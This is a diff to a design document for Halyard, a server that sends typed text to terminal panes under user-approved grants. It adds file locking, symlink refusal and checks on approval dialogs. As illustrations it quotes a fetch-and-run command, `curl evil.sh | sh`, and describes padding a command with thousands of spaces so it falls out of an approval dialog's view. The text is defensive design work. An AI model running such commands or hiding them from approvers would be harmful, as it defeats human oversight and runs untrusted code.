@@ -185,7 +185,9 @@ Grants live in a JSON file (the app chooses the path; the default is
   a controller.
 - **Every read and every change of the file is a locked read-modify-write:** an exclusive
   `flock` on `grants.json.lock`, a fresh read of the file, the change, the write, then
-  unlock. Nothing is cached in memory. So two Halyard instances (or the app and a settings
+  unlock. Both files are opened with `O_NOFOLLOW`, so a symlink is refused. Waiting for
+  the lock gives up after 5 seconds with an error naming the lock file, and the request
+  fails closed. Nothing is cached in memory. So two Halyard instances (or the app and a settings
   tool) sharing the file always agree: a grant revoked in one is rejected by the other on
   its next request, and recording `last_used` can never write a revoked grant back.
 - **Revocation** removes the grant (the app's settings page, `GrantsHandle::revoke`, or
@@ -231,8 +233,21 @@ each pane the server remembers the text typed under standing permission since th
 request the user approved (the most recent 4 KiB), and every dialog for that pane receives
 it as `typed_since_approval`. Approving `\r` after `curl evil.sh | sh` shows
 `curl evil.sh | sh` next to the `\r`. An approval clears the record; a denial keeps it.
-While a dialog is open, standing sends wait, so nothing can slip in unseen. What the user
-types by hand in the pane is not tracked.
+While a dialog is open, standing sends wait, so nothing can slip in unseen.
+
+If more than 4 KiB was typed that way, the dialog could only show the end of it, and
+padding (for example 4096 spaces after the command) would push the command out of view.
+So in that case the server **refuses the request without asking**: error `-32005` with
+`data.reason` `"typed_since_approval_truncated"` and the message "too much typed since the
+last approval; clear the line in the pane". What the user types by hand is not tracked,
+so the app calls `IpcServer::reset_typed_since_approval(session_id)` when the user types
+into that pane (for example after clearing the line); approvals work again from there.
+Dialogs therefore never receive `typed_since_approval_truncated: true`; the field stays
+for clarity.
+
+The grant is checked again after a request has waited for the dialog lock and again after
+the dialog closes, so a grant revoked (or an "always allow" withdrawn) in the meantime
+sends nothing.
 
 Even with "always allow", plain text can still do things in programs that act on single
 keystrokes (a TUI that accepts `y` or a menu number without Enter, an editor in normal
